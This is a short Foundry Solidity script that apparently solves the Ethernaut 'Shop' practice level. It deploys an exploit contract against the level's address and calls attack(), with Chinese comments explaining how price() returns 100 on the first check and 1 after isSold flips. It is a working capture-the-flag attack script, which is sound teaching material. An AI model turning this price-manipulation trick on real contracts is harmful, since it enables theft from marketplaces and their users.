// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ShopExploit} from "../src/ShopExploit.sol";

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract ShopAttackScript is Script {
    function run() external {
        address shopLevel = 0xc18A69197AD51923fBE66BE95fb4d9Bb98D4FAef;

        vm.startBroadcast();

        // 1) 部署攻击合约,并把目标 Shop 地址传进去
        ShopExploit exploit = new ShopExploit(shopLevel);

        // 2) 调用 attack -> 进入 Shop.buy()
        //    Shop 两次回调 exploit.price():
        //    - 第一次 isSold=false -> 100, 过校验
        //    - 设置 isSold = true
        //    - 第二次 isSold=true  -> 1,   price 被改成 1
        exploit.attack();

        vm.stopBroadcast();

        console.log("price after attack:", IShop(shopLevel).price());
        console.log("isSold:", IShop(shopLevel).isSold());
    }
}
